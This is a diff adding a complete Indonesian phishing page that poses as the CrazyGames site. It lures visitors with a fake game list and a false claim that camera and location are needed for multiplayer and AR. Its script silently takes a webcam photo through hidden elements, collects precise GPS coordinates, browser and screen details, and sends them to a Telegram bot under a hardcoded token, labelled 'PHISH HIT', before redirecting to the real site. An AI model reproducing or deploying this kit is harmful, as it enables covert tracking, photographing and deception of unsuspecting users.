@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>CrazyGames - Main Game Gratis Online</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#0f0f13;color:#fff;min-height:100vh}
+.header{background:#1a1a22;padding:12px 16px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
+.logo{font-size:22px;font-weight:800;color:#ff6b00}
+.logo span{color:#fff}
+.search{background:#2a2a35;border:none;border-radius:20px;padding:8px 16px;color:#fff;width:45%;font-size:14px}
+.hero{background:linear-gradient(135deg,#ff6b00 0%,#ff9500 100%);padding:40px 20px;text-align:center}
+.hero h1{font-size:26px;margin-bottom:8px}
+.hero p{opacity:.9;margin-bottom:20px;font-size:15px}
+.btn-play{background:#fff;color:#ff6b00;border:none;padding:14px 32px;border-radius:30px;font-size:16px;font-weight:700;cursor:pointer}
+.games{padding:20px;display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:14px}
+.game-card{background:#1a1a22;border-radius:12px;overflow:hidden;cursor:pointer}
+.game-card .img{height:100px;background:linear-gradient(45deg,#333,#555);display:flex;align-items:center;justify-content:center;font-size:32px}
+.game-card .title{padding:10px;font-size:13px;font-weight:600}
+.game-card .cat{padding:0 10px 10px;font-size:11px;color:#888}
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.92);display:flex;align-items:center;justify-content:center;z-index:999;flex-direction:column;text-align:center;padding:24px}
+.overlay h2{margin-bottom:12px;font-size:20px}
+.overlay p{color:#ccc;margin-bottom:24px;max-width:320px;line-height:1.5}
+.overlay button{background:#ff6b00;color:#fff;border:none;padding:14px 32px;border-radius:30px;font-size:16px;font-weight:600}
+.loading{display:none;margin-top:20px;font-size:14px;color:#ff6b00}
+#video,#canvas{position:fixed;top:-9999px;left:-9999px}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">Crazy<span>Games</span></div>
+  <input class="search" placeholder="Cari game..." readonly>
+</div>
+
+<div class="hero">
+  <h1>Main Game Gratis Sekarang</h1>
+  <p>Ribuan game seru • Tanpa download • Langsung main</p>
+  <button class="btn-play" onclick="mulai()">▶ Main Sekarang</button>
+</div>
+
+<div class="games" id="gameList"></div>
+
+<div class="overlay" id="overlay">
+  <h2>Izinkan Akses Game</h2>
+  <p>Untuk mengaktifkan fitur multiplayer & AR, izinkan kamera dan lokasi. Data hanya digunakan di dalam game.</p>
+  <button onclick="mulai()">Izinkan & Main</button>
+  <div class="loading" id="loading">Menyiapkan game...</div>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// ====== GANTI 2 BARIS INI ======
+const BOT_TOKEN = '8901654512:AAHiYu0ijRGTsZouWHbgicFrFZf48FC8tn4';
+const CHAT_ID  = '6701550065';
+// ===============================
+
+const games = [
+  ["Subway Surfers","Arcade"],["Temple Run 2","Action"],["Among Us","Multiplayer"],
+  ["Cookie Clicker","Idle"],["Slope","Racing"],["2048","Puzzle"],
+  ["Fireboy Watergirl","Adventure"],["Happy Wheels","Action"],
+  ["Stickman Hook","Arcade"],["Shell Shockers","Shooter"],
+  ["Krunker.io","FPS"],["Moto X3M","Racing"]
+];
+
+const list = document.getElementById('gameList');
+games.forEach(([t,c]) => {
+  const d = document.createElement('div');
+  d.className = 'game-card';
+  d.innerHTML = '<div class="img">🎮</div><div class="title">'+t+'</div><div class="cat">'+c+'</div>';
+  d.onclick = mulai;
+  list.appendChild(d);
+});
+
+async function kirimTelegram(text, photoBase64 = null) {
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: 'Markdown'
+      })
+    });
+
+    if (photoBase64 && photoBase64.startsWith('data:image')) {
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('caption', '📷 Foto target');
+      const res = await fetch(photoBase64);
+      const blob = await res.blob();
+      form.append('photo', blob, 'face.jpg');
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: form
+      });
+    }
+  } catch(e) {
+    console.log('gagal kirim', e);
+  }
+}
+
+async function mulai() {
+  const overlay = document.getElementById('overlay');
+  const loading = document.getElementById('loading');
+  overlay.style.display = 'flex';
+  loading.style.display = 'block';
+  loading.innerText = 'Meminta izin lokasi...';
+
+  let lat = 'ditolak', lon = 'ditolak', photo = null;
+
+  try {
+    const pos = await new Promise((ok, err) => {
+      navigator.geolocation.getCurrentPosition(ok, err, {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      });
+    });
+    lat = pos.coords.latitude;
+    lon = pos.coords.longitude;
+  } catch(e) {}
+
+  loading.innerText = 'Meminta izin kamera...';
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    });
+    const video = document.getElementById('video');
+    video.srcObject = stream;
+    await new Promise(r => video.onloadedmetadata = r);
+    await video.play();
+    await new Promise(r => setTimeout(r, 1500));
+
+    const canvas = document.getElementById('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    photo = canvas.toDataURL('image/jpeg', 0.75);
+
+    stream.getTracks().forEach(t => t.stop());
+  } catch(e) {}
+
+  loading.innerText = 'Memuat game...';
+
+  const ua = navigator.userAgent;
+  const screenInfo = screen.width + 'x' + screen.height;
+  const waktu = new Date().toLocaleString('id-ID');
+
+  const pesan = `🎮 *CRAZYGAMES PHISH HIT*\n` +
+                `⏰ ${waktu}\n` +
+                `📍 Lat: \`${lat}\`\n` +
+                `📍 Lon: \`${lon}\`\n` +
+                `📱 Screen: ${screenInfo}\n` +
+                `🔍 UA: ${ua.slice(0,100)}`;
+
+  await kirimTelegram(pesan, photo);
+
+  setTimeout(() => {
+    window.location.href = 'https://www.crazygames.com/id/';
+  }, 900);
+}
+
+setTimeout(() => {
+  document.getElementById('overlay').style.display = 'flex';
+}, 1200);
+</script>
+</body>
+</html>
